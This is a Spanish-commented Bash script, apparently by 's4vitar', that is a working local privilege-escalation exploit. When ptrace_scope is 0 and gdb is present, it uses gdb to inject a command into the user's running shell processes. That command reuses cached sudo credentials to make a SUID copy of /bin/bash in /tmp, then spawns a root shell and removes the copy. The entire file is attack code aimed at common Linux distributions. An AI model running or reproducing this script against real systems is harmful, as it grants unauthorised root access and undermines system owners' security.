#!/bin/bash
#Sistemas vulnerables: Kali, Parrot, Centos, RedHat, Debian, Ubuntu
#Made by s4vitar

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
	echo -e "\n\n${yellowColour}[*]${endColour}${grayColour} Saliendo...${endColour}\n"
	tput cnorm; exit 0
}

function startAttack(){
	tput civis && pgrep "$(cat /etc/shells | grep -v "shells" | tr '/' ' ' | awk 'NF{print $NF}' | sort -u | xargs | tr ' ' '|')" -u "$(id -u)" | while read shell_pid; do
		if [ $(cat /proc/$shell_pid/comm 2>/dev/null) ] || [ $(pwdx $shell_pid 2>/dev/null)]; then
			echo -e "\n${yellowColour}[*] PID ->${endColour}${blueColour} $shell_pid${endColour}"
			echo -e "${yellowColour}[*] Path ->${endColour}${blueColour} $(pwdx $shell_pid 2>/dev/null)${endColour}"
			echo -e "${yellowColour}[*] Type -> ${endColour}${blueColour} $(cat /proc/$shell_pid/comm 2>/dev/null)${endColour}"

		fi; echo 'call system("echo | sudo -S cp /bin/bash /tmp > /dev/null 2>&1 && echo | sudo -S chmod +s /tmp/bash > /dev/null 2>&1"")' | gdb -q -n -p "$shell_pid" >/dev/null 2>&1

	done

	if [ -f /tmp/bash ]; then
		/tmp/bash -p -c 'echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Limpiando...${endColour}"
				rm /tmp/bash
				echo -e "\t${greenColour}[V]${endColour}"
				echo -ne "${yellowColour}[*]${endColour}${grayColour} Obteniendo shell como root...${endColour}"
				echo -e "\t${greenColour}[V]${endColour}\n"
				tput cnorm && bash -p'
	else
		echo -e "\n${redColour}[*] No ha sido posible copiar el SUID al archivo /tmp/bash${endColour}" 
	fi
}

echo -ne "\n${yellowColour}[i]${endColour}${grayColour} Checkeando si 'ptrace_scope' está en 0 ...${endColour}"

if grep -q "0" < /proc/sys/kernel/yama/ptrace_scope; then
	echo -e "\t${greenColour}[V]${endColour}"
	echo -ne "${yellowColour}[i]${endColour}${grayColour} Comprobando si 'GDB' se encuentra instalado${endColour}"

	if command -v gdb > /dev/null 2>&1; then
		echo -e "\t${greenColour}[V]${endColour}"
		echo -e "\n${yellowColour}[i]${endColour}${grayColour} El sistema es vulnerable!${endColour}${greenColour}\t[V]${endColour}\n"

		startAttack
	else
		echo -e "\t${redColour}[X]${endColour}"
		echo -e "${yellowColour} El sistema no es vulnerable :(${endColour}${redColour}\t[X]${endColour}"
	fi 
else
	echo -e "${redColour}\t[X]${endColour}"
	echo -e "${yellowColour}[*]${endColour}${grayColour} El sistema no es vulnerable :(${endColour}${redColour} [X]${endColour}"
fi
